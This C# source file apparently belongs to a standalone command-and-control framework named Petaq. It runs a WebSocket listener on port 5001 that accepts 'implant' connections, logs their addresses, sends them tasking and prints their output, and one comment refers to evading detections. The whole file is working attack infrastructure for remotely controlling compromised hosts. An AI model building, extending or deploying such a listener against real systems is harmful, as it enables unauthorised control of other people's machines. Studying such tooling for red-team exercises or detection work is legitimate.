using System;
using System.Net.WebSockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore;
using Microsoft.AspNetCore.Builder;
using Microsoft.Extensions.Hosting;


namespace Petaq_C2_Standalone
{
    public class ServiceSocket
    {
        public IWebHost iWebHost { get; set; }
        private CancellationToken HTTPServiceCancellationToken = default;

        public WebSocket ClientSocket = null;

        public ServiceSocket()
        {                     
        }


        public IWebHostBuilder CreateWebHostBuilder() =>
          WebHost.CreateDefaultBuilder()
          .ConfigureKestrel(serverOptions =>
          {
              // Setting up listener for the given Port and any IP
              serverOptions.ListenAnyIP(5001, 
                listenOptions =>
                {
                    // // Setting up the TLS settings
                    // if (ChannelObject.TLS)
                    // {
                    //     listenOptions.UseHttps("TLSCERTPATH", "TLSCertPassword");
                    // }
                });
          })
         ;

        public void Start() {
      
            iWebHost = new WebHostBuilder()
                .UseKestrel()
                .ConfigureKestrel(serverOptions =>
                {            
                    // Setting up listener for the given Port and any IP
                    serverOptions.ListenAnyIP(5001, 
                        listenOptions =>
                        {
                            // // Setting up the TLS settings
                            // if (ChannelObject.TLS)
                            // {
                            //     listenOptions.UseHttps("TLSCERTPATH", "TLSCertPassword");
                            // }
                        });
                })
                .Configure(app => {
                    // Set the websocket options
                    WebSocketOptions webSocketOptions = new WebSocketOptions()
                    {
                        // Keepalive may be important for some detections
                        KeepAliveInterval = TimeSpan.FromSeconds(120),
                    };
                    app.UseWebSockets(webSocketOptions);

                    app.Run(async (context) =>
                    {                        
                        string reqURI=context.Request.Path+context.Request.QueryString;

                        // Print out the implant details
                        Console.Write(
                            "\nNew implant connected from: {0}:{1}\n# ",
                            context.Connection.RemoteIpAddress, context.Connection.RemotePort
                           );

                        // tasking
                        var completion = new TaskCompletionSource<object>();

                        if (context.WebSockets.IsWebSocketRequest)
                        {

                            // getting the websocket
                            ClientSocket = await context.WebSockets.AcceptWebSocketAsync();                           

                            // starting receive from the implant                            
                            _ = Task.Run(() => ReceiveAsync(ClientSocket));
                            await completion.Task;

                        }
                        else
                        {
                            context.Response.ContentType = "text/html";
                            await context.Response.Body.WriteAsync(Encoding.UTF8.GetBytes("Socket couldn't start!"));
                        }

                    });
                })
                .Build();
        
            iWebHost.RunAsync(HTTPServiceCancellationToken);
        }

        public bool Stop()
        {
            iWebHost.RunAsync(CancellationToken.None);       
            return false;
        }

        public bool Send(byte[] data)
        {
            ClientSocket.SendAsync(data, WebSocketMessageType.Text, true, CancellationToken.None);
            return true;
        }
        public async Task ReceiveAsync(WebSocket wsocket)
        {

            try
            {
                while (wsocket.State == WebSocketState.Open)
                {
                    // read from the socket
                    byte[] rbuffer = new byte[4000];
                    var result = await wsocket.ReceiveAsync(new ArraySegment<byte>(rbuffer), CancellationToken.None);
                    
                    // closing the socket if requested
                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        await wsocket.CloseOutputAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
                        //UpdateStatusOnDisconnect();
                        break;
                    }
                    
                    // remove null bytes
                    string buffertext= Encoding.UTF8.GetString(rbuffer).Replace("\0", string.Empty);
                    
                    // print the content
                    Console.Write(buffertext);
                
                    
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Client is disconnected. Message: {0}", e.Message);
                await wsocket.CloseOutputAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
            }

        }

    }
}
